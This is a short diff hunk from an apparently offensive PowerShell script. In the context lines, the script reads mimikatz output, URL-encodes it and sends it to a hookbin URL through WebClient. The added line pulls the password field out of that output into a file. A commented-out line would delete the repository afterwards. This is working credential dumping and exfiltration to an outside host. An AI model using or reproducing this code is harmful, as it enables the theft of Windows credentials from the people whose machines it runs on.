@@ -28,6 +28,7 @@ $out = Get-Content ./output_mimikatz
 $out_encoded  = [System.Web.HttpUtility]::UrlEncode($out)
 (new-object System.net.WebClient).DownloadString("${uri_hookbin}?q=${out_encoded}") > $null 2>&1 
 
+cat ./output_mimikatz | Select -Index 33 | FoReach-Object { $_.split(':')[1] } >> ./password_output
 # Cleaning
 cd $repo_path/..
 #rm -rf $repo_path > $null 2>&1 
